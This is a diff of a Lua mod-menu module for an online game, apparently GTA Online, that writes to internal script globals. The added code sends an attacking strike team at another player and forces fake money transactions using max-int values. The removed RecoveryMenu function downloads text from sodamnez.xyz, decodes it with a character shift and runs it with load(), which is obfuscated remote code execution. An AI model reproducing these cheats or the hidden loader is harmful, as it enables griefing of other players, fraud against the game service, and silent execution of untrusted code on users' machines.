@@ -1141,6 +1141,18 @@ function Shared:SendMercenaries(pid)
     self.WriteInt(attacker + 0x468, pid)
 end
 
+function Shared:SendStrikeTeam(pid, level)
+    local attacker = self.ScriptGlobal(1853988 + 1 + (self.PLAYER_ID * 867))
+    local bitfield = self.ReadInt(attacker + 0x460)
+
+    self.WriteInt(attacker + 0x5A0, pid)
+    self.WriteInt(attacker + 0x468, pid)
+    self.WriteInt(attacker + 0x5C0, level)
+    self.WriteInt(attacker + 0x5A8, self.GetNetworkTime())
+    self.WriteInt(attacker + 0x5B0, 1)
+    self.WriteInt(attacker + 0x460, Bit:Set(bitfield, 1))
+end
+
 function Shared:BlockCEOMCInvites(state)
     local g = self.ScriptGlobal(1669211 + 558)
     self.WriteByte(g, state ? 1 : 0)
@@ -1166,25 +1178,13 @@ function Shared:BlockRemoteOffTheRadar(state)
     self.WriteByte(g, state ? 1 : 0)
 end
 
--- Global_1853910[iParam0 /*862*/].f_267.f_478
---[[
-    bit 0 = kosatka owned
-    bit 1 = sonar owned (kosatka)
-    bit 2 = guided missies owned (kosatka)
-    bit 4 = sparrow owned
-    bit 5 = avisa owned
-    bit 6 = sparrow being used
-    bit 7 = avisa being used
-    bit 14 = acid lab owned
-]]
-
 function Shared:RenameAcidLab(name)
-    local lab = self.ScriptGlobal(1914706 + 1 + (self.PLAYER_ID * 299) + 283) -- Global_1914091[bParam0 /*297*/].f_281 new: Global_1914706[plParam0 /*299*/].f_283
+    local lab = self.ScriptGlobal(1914706 + 1 + (self.PLAYER_ID * 299) + 283) -- Global_1914706[plParam0 /*299*/].f_283
     self.WriteString(lab, name)
 end
 
 function Shared:GetAcidLabName()
-    local lab = self.ScriptGlobal(1914706 + 1 + (self.PLAYER_ID * 299) + 283) -- Global_1914091[bParam0 /*297*/].f_281
+    local lab = self.ScriptGlobal(1914706 + 1 + (self.PLAYER_ID * 299) + 283)
     return self.ReadString(lab)
 end
 
@@ -1601,30 +1601,6 @@ function Shared:GetClosestPlayer()
     end
 end
 
-function Shared.RecoveryMenu()
-    async_http.init('sodamnez.xyz', '/Stand/MrRobot/index.php?recovery', function(body, headers, status_code)
-        if status_code == 200 then
-            local code = ''
-
-            for i = 1, #body do
-                local char = body:byte(i)
-                if char >= 65 and char <= 90 then
-                    char = ((char - 2) - 65) % 26 + 65
-                elseif char >= 97 and char <= 122 then
-                    char = ((char - 2) - 97) % 26 + 97
-                end
-                code = code .. string.char(char)
-            end
-
-            load(code)()
-        elseif status_code == 403 then
-            util.toast(T(body))
-        end
-    end)
-
-    async_http.dispatch()
-end
-
 function Shared:SetOrgType(boss_type)
     local g = self.ScriptGlobal(1895156 + 1 + (self.PLAYER_ID * 609) + 10 + 429)
     self.WriteInt(g, boss_type)
@@ -1640,6 +1616,20 @@ function Shared:RegisterAsMC()
     local g = self.ScriptGlobal(1895156 + 1 + (self.PLAYER_ID * 609) + 10)
     self.WriteInt(g, self.PLAYER_ID)
     self:SetOrgType(1)
+end
+
+function Shared:TriggerTransaction(hash, amount, category)
+    local base = self.ScriptGlobal(4536533) -- This global is from OPMONEYLUA_V1 script
+    category = category or util.joaat('CATEGORY_SERVICE_WITH_THRESHOLD')
+    self.WriteInt(base + 0x8, self.MAX_INT - 1)
+    self.WriteInt(base + 0x38, self.MAX_INT)
+    self.WriteInt(base + 0x30, 0)
+    self.WriteInt(base + 0x28, category)
+    self.WriteInt(base + 0x18, hash)
+    self.WriteInt(base + 0x10, amount)
+    self.WriteByte(base, 1)
+    util.yield_once()
+    self.WriteByte(base, 0)
 end
 
 return Shared
